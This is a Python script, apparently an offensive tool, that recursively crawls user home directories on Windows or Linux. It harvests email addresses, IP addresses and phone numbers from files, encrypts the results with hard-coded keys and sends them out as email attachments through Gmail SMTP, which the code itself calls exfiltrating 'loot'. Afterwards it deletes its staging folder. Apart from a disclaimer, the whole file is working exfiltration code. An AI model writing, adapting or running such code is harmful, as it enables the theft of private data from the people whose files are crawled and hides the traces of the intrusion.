# pylint: disable=W0106
"""
This tool may be used for legal purposes only.
Users take full responsibility for any actions performed using this tool.
The author accepts no liability for damage caused by this tool.
If these terms are not acceptable to you, then do not use this tool.

Built-in modules """
import logging
import os
import pathlib
import re
import shutil
import smtplib
import sys
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from hashlib import sha512
# External modules #
from cryptography.fernet import Fernet


def create_attachment(path: str, file: str) -> MIMEBase:
    """
    Creates attachment instance, populates it, and returns it to send_main() function.

    :param path:  The path to the file to be attached.
    :param file:  The name of the file to be attached.
    :return:  The populated attachment instance.
    """
    # Initialize attachment object #
    payload = MIMEBase('application', 'octet-stream')

    # Open the file and set as attachment payload #
    with open(f'{path}{file}', 'rb') as attachment:
        payload.set_payload(attachment.read())

    # Encode attachment as base64 #
    encoders.encode_base64(payload)
    # Add header to attachment object #
    payload.add_header('Content-Disposition', f'attachment;filename = {file}')
    return payload


def smtp_handler(email_addr: str, secret: str, message: MIMEMultipart):
    """
    Facilitates sending the email to Gmail through SMTP protocol.

    :param email_addr:  The email address where the data will be emailed.
    :param secret:  The application password generated in users Google account.
    :param message:  The email message instance.
    :return:  Nothing
    """
    try:
        # Establish gmail SMTP session #
        with smtplib.SMTP('smtp.gmail.com', 587) as session:
            # Upgrade session to tls encryption #
            session.starttls()
            # Login to gmail account #
            session.login(email_addr, secret)
            # Sent the messages and end session #
            session.sendmail(email_addr, email_addr, message.as_string())
            session.quit()

    # If socket or SMTP error occurs #
    except (OSError, smtplib.SMTPException) as mail_err:
        print_err(f'SMTP error occurred: {mail_err}')
        logging.exception('SMTP error occurred: %s\n\n', mail_err)


def create_email(email_addr: str) -> MIMEMultipart:
    """
    Creates email instance and formats the header and body. This sets the email to send to itself, \
    since the goal is to log in and yourself email with the attached data.

    :param email_addr:  The email address associated with email.
    :return:  The formatted email instance.
    """
    # Create message instance #
    email = MIMEMultipart()
    # Format email header #
    email['From'] = email_addr
    email['To'] = email_addr
    email['Subject'] = 'Success!!!'
    # Attach message to body #
    body = 'Mission is completed'
    email.attach(MIMEText(body, 'plain'))
    return email


def send_email(path: str):
    """
    Facilitates exfiltrating encrypted loot data via Gmail.

    :param path:  The path to directory where the data to be emailed resides.
    :return:  Nothing
    """
    # Populate email header and body #
    email_address = ''               # <= Enter email address
    password = ''                    # <= Enter gmail application generate password

    # Create message instance #
    msg = create_email(email_address)
    email_size = 0

    # If the OS is Windows #
    if os.name == 'nt':
        re_attachment = re.compile(r'^e_[^<>:\"/\\|?*]{1,255}')
    # If the OS is Linux #
    else:
        re_attachment = re.compile(r'^e_[^/]{1,255}')

    attach_list = []
    # Add files in path to the attachment file list #
    [attach_list.append(file.name) for file in os.scandir(path) if not os.path.isdir(file.name)]

    # Iterate though result files and attach to email #
    for file in attach_list:
        # If item is encrypted attachment file #
        if re_attachment.match(file):
            # Add size of file to total email size #
            file_size = os.stat(f'{path}{file}').st_size
            email_size += file_size

            # If the email size is greater than or equal to 20 MB #
            if email_size >= 20_000_000:
                # Send the email via SMTP #
                smtp_handler(email_address, password, msg)

                # Re-create message instance #
                msg = create_email(email_address)
                # Reset email size to just current file #
                email_size = file_size

            # Create attachment instance of current file #
            payload = create_attachment(path, file)
            # Attach attachment to message #
            msg.attach(payload)

    # Send the email via SMTP #
    smtp_handler(email_address, password, msg)


def crypto_hash(path: str):
    """
    Encrypts the hashes file.

    :param path:  The path where the file to be hashed resides.
    :return:  Nothing
    """
    # Encrypt file with hashes #
    hash_key = b'AP92lIGyU8Zqnc568KT5ugjInAo28qwBuB5fzWYQfz0='

    try:
        # Read the file hashes in plain text #
        with open(f'{path}SHA_Hashes.txt', 'rb') as plain_text:
            data = plain_text.read()

        # Encrypt the file hashes #
        encrypted = Fernet(hash_key).encrypt(data)

        # Write the encrypted file hashes to fresh file #
        with open(f'{path}e_SHA_Hashes.txt', 'wb') as encrypted_text:
            encrypted_text.write(encrypted)

    # If error occurs during file operation #
    except (IOError, OSError) as io_err:
        print_err(f'Error occurred accessing hash files: {io_err}')
        logging.exception('Error occurred accessing hash files: %s\n\n', io_err)


def crypto_data(path: str):
    """
    Hashes the plain text data, encrypts the data, then hashes the encrypted data.

    :param path:  The path where the files to be hashed reside.
    :return:  Nothing
    """
    # Hash the data #
    key = b'UR58Mz1VHiGJa1_W42E4G0FD__Ihb4vevs3wmWhVtOc='

    # Iterate through files in path #
    for file in os.scandir(path):
        # If the current item is dir #
        if os.path.isdir(file.name):
            continue

        try:
            # Hash the plain text file #
            sha = sha512(str.encode(file.name)).hexdigest()

            # Write the hash to the hashes file #
            with open(f'{path}SHA_Hashes.txt', 'a', encoding='utf-8') as hash_plain:
                hash_plain.write(f'{file.name}\nPlain Text SHA:\n{str(sha)}\n')

            # Read the file contents and encrypt them #
            with open(f'{path}{file.name}', 'rb') as plain_text:
                data = plain_text.read()

            # Encrypt the plain text #
            encrypted = Fernet(key).encrypt(data)

            # Write encrypted cipher to text to fresh file #
            with open(f'{path}e_{file.name}', 'wb') as encrypted_text:
                encrypted_text.write(encrypted)

            # Hash the cipher text file #
            e_sha = sha512(str.encode(f'e_{file.name}')).hexdigest()

            # Write the hash of cipher text to hash file #
            with open(f'{path}SHA_Hashes.txt', 'a', encoding='utf-8') as hash_encrypt:
                hash_encrypt.write(f'\nEncrypted SHA:\n{str(e_sha)}\n\n\n')

        # If error occurs during file operation #
        except (IOError, OSError) as io_err:
            print_err(f'Error occurred accessing hash files: {io_err}')
            logging.exception('Error occurred accessing hash files: %s\n\n', io_err)


def match_logger(re_obj: object, dir_path: str, file: str, path: str, match_count: int) -> int:
    """
    Iterates through file line by line, attempting to find regex matches to log to the log file.

    :param re_obj:  Compile regex instance.
    :param dir_path:  os walk current iteration directory path.
    :param file:  os walk current iteration file name.
    :param path:  Path to output loot directory.
    :param match_count:  The current match file number.
    :return:  Updated match count.
    """
    try:
        # If the OS is Windows #
        if os.name == 'nt':
            match_path = f'{dir_path}\\{file}'
        # If the OS is Linux #
        else:
            match_path = f'{dir_path}/{file}'

        match_log = f'{path}crawlMatches{match_count}.txt'

        # Open the file, iterating line by line #
        with open(match_path, 'r', encoding='utf-8') as search_file:
            for line in search_file:
                print(line)

                # If line matches a regular expression #
                if re_obj.email.search(line) or re_obj.ip_addr.search(line)\
                or re_obj.phone.search(line):
                    # Check if log file is within the set size limit, if not set new log file #
                    match_log, match_count = size_check(match_log, match_count,
                                                        path, 'crawlMatches')
                    # Write results to match file #
                    with open(match_log, 'a', encoding='utf-8') as details:
                        details.write(f'Path => {dir_path}\n')
                        details.write(f'File => {file}\n')
                        details.write(f'Match => {line}\n\n')

    # If error occurs during file operation #
    except (IOError, OSError, UnicodeError) as file_err:
        if not UnicodeError:
            print_err('Error occurred during file operation to match log')
            logging.exception('Error occurred during file operation to match log: %s\n\n', file_err)

    return match_count


def size_check(log_name: str, log_num: int, log_path: str, base_name: str) -> tuple:
    """
    Checks the size of the passed in log name. If it is greater than or equal to 10 MB, increment \
    the log number and reset the log name with the log number. So log_name1 would become log_name2.

    :param log_name:  The name of the logger file.
    :param log_num:  The current logger file number.
    :param log_path:  The file path where the logger file is stored.
    :param base_name:  The base name of the log file.
    :return: The logger file name and number, modified or not.
    """
    try:
        # If the file size is greater than or equal than 10 MB
        if os.stat(log_name).st_size >= 10_000_000:
            # Increment log count and reformat name #
            log_num += 1
            log_name = f'{log_path}{base_name}{log_num}.txt'

    # If the log file does not exist yet #
    except FileNotFoundError:
        pass

    return log_name, log_num


class CompiledRegex:
    """ Class to group various compiled regex statements. """
    txt = None
    file = None
    email = None
    ip_addr = None
    phone = None


def print_err(msg: str):
    """
    Prints error message through stderr.

    :param msg:  The message to be displayed through stderr.
    :return:  Nothing
    """
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)


def main():
    """
    Recursively crawls through user directories, searching through files for regex matches to log \
    to a text file to encrypt and exfiltrate via email.

    :return:  Nothing
    """
    # Get the starting execution time #
    print('Crawling ...')
    # Initialize compiled regex object #
    re_obj = CompiledRegex()

    # If the OS is Windows #
    if os.name == 'nt':
        path = 'C:\\Tmp\\'
        crawl_path = 'C:\\Users'

        # Ensure storage path for exfiltration data exists #
        pathlib.Path(path).mkdir(parents=True, exist_ok=True)
        # Initialize logging facilities #
        logging.basicConfig(level=logging.DEBUG, filename=f'{path}\\error_log.log')

        # Set accepted file types with tuple grouping #
        ext = ('.accdb', '.bat', '.c', '.cc', '.cpp', '.css', '.csv', '.db', '.doc', '.docm',
               '.docx', '.eml', '.exe', '.h', '.htm', '.html', '.ini', '.iso', '.java', '.msi',
               '.php', '.phps', '.phtml', '.pl', '.py', '.rtf', '.tmp', '.txt', '.xml')

        # Format program regex #
        re_obj.txt = re.compile(r'[^<>:\"/\\|?*]{1,255}$')
    # If the OS is Linux #
    else:
        path = '/tmp/crawl_files/'
        crawl_path = '/home'

        # Ensure storage path for exfiltration data exists #
        pathlib.Path(path).mkdir(parents=True, exist_ok=True)
        # Initialize logging facilities #
        logging.basicConfig(level=logging.DEBUG, filename=f'{path}/error_log.log')

        # Set accepted file types with tuple grouping #
        ext = ('.asm', '.c', '.cc', '.conf', '.cfg', '.cpp', '.css', '.csv', '.db',
               '.deb', '.h', '.htm', '.html', '.java', '.log', '.php', '.phps',
               '.phtml', '.pl', '.py', '.rtf', '.s', '.sh', '.txt', '.xml')

        # Format program regex #
        re_obj.txt = re.compile(r'[^/]{1,255}$')
        re_obj.file = re.compile(r'^\.?\w{1,255}$')

    # Compile regex for matching data in files #
    re_obj.email = re.compile(r'^[a-zA-Z\d!#$%&\'*+-/=^_{|}~.]{1,64}@[a-z]{1,12}\.[a-z]{2,4}')
    re_obj.ip_addr = re.compile(r'(?:\s|^)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
    re_obj.phone = re.compile(r'(1?)(?:\s|^)\d{3}-\d{3}-\d{4}')

    log_count = 1
    match_count = 1
    crawl_log = f'{path}crawlLog{log_count}.txt'

    # Iterate recursively through paths, directories, and files in path #
    for dir_path, dir_names, file_names in os.walk(crawl_path):
        # Check if log file is within the set size limit, if not set new log file #
        crawl_log, log_count = size_check(crawl_log, log_count, path, 'crawlLog')

        # Open the crawl in append mode to log matches #
        with open(crawl_log, 'a', encoding='utf-8') as log:
            log.write(f'Path => {dir_path}\n')

            # Iterate through directories and log names #
            [log.write(f'Dir => {current}\n') for current in dir_names]
            log.write('\n')

            # Iterate through files and log names #
            for file in file_names:
                log.write(f'File => {file}\n')

                # If the file is not in allow extensions tuple #
                if not file.endswith(ext):
                    # If file regex was compiled (Linux) #
                    if re_obj.file:
                        # If the file regex failed to match #
                        if not re.search(re_obj.file, file):
                            continue
                    else:
                        continue

                # If file matches regex #
                if re_obj.txt.match(file):
                    # Iterate through file and attempt to file match to log #
                    match_count = match_logger(re_obj, dir_path, file, path, match_count)

            log.write('\n')

    # Hash plain text, encrypt it, and hash encrypted #
    crypto_data(path)
    # Encrypt the hashes file #
    crypto_hash(path)
    # Exfiltrate encrypted data via Gmail #
    send_email(path)

    # Shutdown the logging facilities #
    logging.shutdown()
    # Delete any contents contained in path #
    try:
        shutil.rmtree(path)

    # If unable to delete because being used by other process #
    except PermissionError as del_err:
        logging.exception('Error occurred deleting contents: %s\n\n', del_err)

    print('\nAll Done!!')


if __name__ == '__main__':
    try:
        main()

    # If Ctrl + C is detected #
    except KeyboardInterrupt:
        print('Ctrl+C detected .. exiting')

    sys.exit(0)
